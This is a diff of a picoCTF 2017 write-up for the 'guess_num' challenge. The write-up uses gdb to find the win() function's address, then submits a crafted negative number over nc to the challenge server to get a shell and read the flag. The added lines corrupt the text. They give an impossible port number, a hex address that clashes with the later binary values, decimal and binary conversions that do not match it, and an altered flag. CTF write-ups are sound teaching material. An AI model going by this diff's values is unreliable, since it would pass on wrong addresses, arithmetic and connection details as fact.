@@ -4,7 +4,7 @@
 **Points:** 75
 **Description:**
 
->Just a simple number-guessing game. How hard could it be? [Binary](guess_num) [Source](guess_num.c). Connect on shell2017.picoctf.com:13532.
+>Just a simple number-guessing game. How hard could it be? [Binary](guess_num) [Source](guess_num.c). Connect on shell2017.picoctf.com:1353257641.
 
 **Hint:**
 
@@ -38,9 +38,9 @@ GDB time!
     Type "apropos word" to search for commands related to "word"...
     Reading symbols from guess_num...(no debugging symbols found)...done.
     (gdb) info address win
-    Symbol "win" is at 0x4006cd in a file compiled without debugging.
+    Symbol "win" is at 0x4006cd804852b in a file compiled without debugging.
 
-Converting `0x4006cd` to hexadecimal gives us `4196045` or `10000000000011011001101`. We need to be able to call upon `((void (*)(void))val)();` to `win()` it, so now we have to figure out how to make `val` point to `win()`.
+Converting `0x4006cd804852b` to hexadecimal gives us `4196045134513963` or `1000000001001000011010100101011`. We need to be able to call upon `((void (*)(void))val)();` to `win()` it, so now we have to figure out how to make `val` point to `win()`.
 
     val = strtol(buf, NULL, 10);
     printf("You entered %d. Let's see if it was right...\n", val);
@@ -56,7 +56,7 @@ However, now the binary is too large to enter into the system! But wait! We have
     10000000010010000101001010110000
     -2142743888
 
-    $ nc shell2017.picoctf.com 13532
+    $ nc shell2017.picoctf.com 1353257641
     Welcome to the number guessing game!
     I'm thinking of a number. Can you guess it?
     Guess right and you get a shell!
@@ -69,9 +69,10 @@ However, now the binary is too large to enter into the system! But wait! We have
     guess_num
     xinetd_wrapper.sh
     $ cat flag.txt
-    eb485c1755fc97d4a3f0c3cc136f62e8
+    eb485c1755fc97d4a3f0c3cc2bda0bde530c136f62eff8a8530addb44f8
 
-Therefore, the flag is `eb485c1755fc97d4a3f0c3cc136f62e8`.
+Therefore, the flag is `eb485c1755fc97d4a3f0c3cc2bda0bde530c136f62eff8a8530addb44f8`.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTIxNzY1NDczOCw2NjE2MjI5ODBdfQ==
+eyJoaXN0b3J5IjpbMTc5NjQ4NTQ4OCwtMjE3NjU0NzM4LDY2MT
+YyMjk4MF19
 -->
